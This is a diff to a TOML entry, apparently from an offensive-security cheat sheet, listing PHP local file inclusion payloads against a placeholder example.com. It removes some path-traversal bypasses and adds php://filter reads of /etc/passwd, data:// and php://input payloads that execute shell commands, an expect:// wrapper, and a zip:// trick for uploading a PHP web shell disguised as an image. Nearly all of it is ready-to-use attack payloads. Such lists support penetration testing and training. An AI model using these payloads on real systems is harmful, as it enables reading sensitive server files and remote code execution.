@@ -4,29 +4,39 @@ tags = ["web", "LFI", "RCE", "bypass"]
 source = ["https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225"]
 
 [[data]]
-description = "PHP wrapper:"
-command = """example.com/view.php?file=php://filter/resource=../../../../etc/passwd"""
-
-[[data]]
-description = "PHP wrapper (base64):"
-command = """example.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"""
-
-[[data]]
-description = "RCE through PHP data wrapper with base64:"
-command = """example.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="""
-
-[[data]]
-description = "Bypass non-recursively stripped path traversal sequence defense"
-command = """example.com/view.php?file=....//....//....//....//etc/passwd"""
-
-[[data]]
-description = "Bypass with URL encode"
-command = """#Simple URL encode
-example.com/view.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
-#Double URL encode
-example.com/view.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+description = "PHP 'filter' wrapper ('php://filter' is case insensitive):"
+command = """example.com/view.php?file=php://filter/resource=../../../../etc/passwd
+example.com/view.php?file=php://filter/read=string.rot13/resource=../../../../../etc/passwd
+example.com/view.php?file=php://filter/convert.iconv.utf-8.utf-16/resource=../../../../../etc/passwd
+example.com/view.php?file=php://filter/convert.iconv.utf-8.utf-16/resource=../../../../../etc/passwd
+example.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+example.com/view.php?file=pHp://FilTer/convert.base64-encode/resource=../../../../../etc/passwd
+example.com/view.php?file=php://filter/zlib.deflate/convert.base64-encode/resource=../../../../../etc/passwd (to decode: base64 decode -> raw inflate)
 """
 
 [[data]]
-description = "Bypass with null byte php < 5.3"
-command = """example.com/view.php?file=../../../../etc/passwd%00"""
+description = "RCE through PHP 'data://' wrapper with base64:"
+command = """example.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Pg==
+example.com/view.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="""
+
+[[data]]
+description = "RCE through PHP 'expect://' wrapper:"
+command = """example.com/view.php?file=expect://id
+example.com/view.php?file=expect://ls
+example.com/view.php?file=expect://whoami"""
+
+[[data]]
+description = "RCE through PHP 'input://' wrapper:"
+command = """Specify the payload in the POST parameter
+curl -X POST --data "<?php echo shell_exec('id'); ?>" "example.com/view.php?file=php://input%00" -k -v"""
+
+[[data]]
+description = "RCE through PHP 'zip://' wrapper:"
+command = """# If you are able to upload images, create a payload, zip it, rename it to image and upload it
+echo "<?php system($_GET[0]); ?>" > payload.php
+zip payload.zip payload.php
+mv payload.php payload.jpg
+
+# After uploading it, access the file via wrappers 
+example.com/view.php?file=zip://shell.jpg%23payload.php
+"""
